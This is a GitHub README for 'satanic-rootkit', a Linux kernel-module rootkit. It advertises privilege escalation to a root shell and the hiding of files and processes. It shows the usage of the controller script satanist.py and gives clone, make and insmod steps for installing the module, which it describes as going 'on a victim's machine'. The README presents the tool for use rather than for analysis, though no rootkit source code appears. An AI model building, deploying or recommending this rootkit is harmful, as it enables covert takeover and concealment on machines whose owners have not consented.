<div align="center">
  <img src="https://github.com/aesophor/satanic-rootkit/blob/master/.meta/banner.jpg">
  <b>CAUTION: Do NOT test this on physical machines!</b>
</div>

## Overview
* Local privilege escalation (grant root shell)
* Hide directories or files **by absolute path**
* Hide processes by PID
* ...

## satanist.py
After installing the kernel module `satan.ko` on a victim's machine, one can use `satanist.py` to command the rootkit.
```
> ./satanist.py --help                 
usage: ./satanist.py <command> [argument]

-su --privesc <passphrase>       -- Acquire root shell.
-fh --file-hide <path>           -- Hide a file/directory by absolute path.
-fu --file-unhide <path>         -- Unhide a file/directory by absolute path.
-ph --proc-hide <pid>            -- Hide a process by PID.
-pu --proc-unhide <pid>          -- Unhide a process by PID.

-h --help                        -- Help message.
-v --version                     -- Version info.
```

## Tested On
* Debian 9 stretch 4.9.0-11

## Build Requirements
* gcc
* GNU Make
* Linux headers

## Usage
1. Build kernel module.
```
$ git clone https://github.com/aesophor/satanic-rootkit.git
$ cd satanic-rootkit
$ make
```

2. Insert kernel module as root.
```
root# insmod satan.ko
```

3. Run satanist.py as normal user to command the rootkit.
```
$ ./satanist.py --help
```

## License
Available under [GPL-2.0 License](https://github.com/aesophor/satanic-rootkit/blob/master/LICENSE)
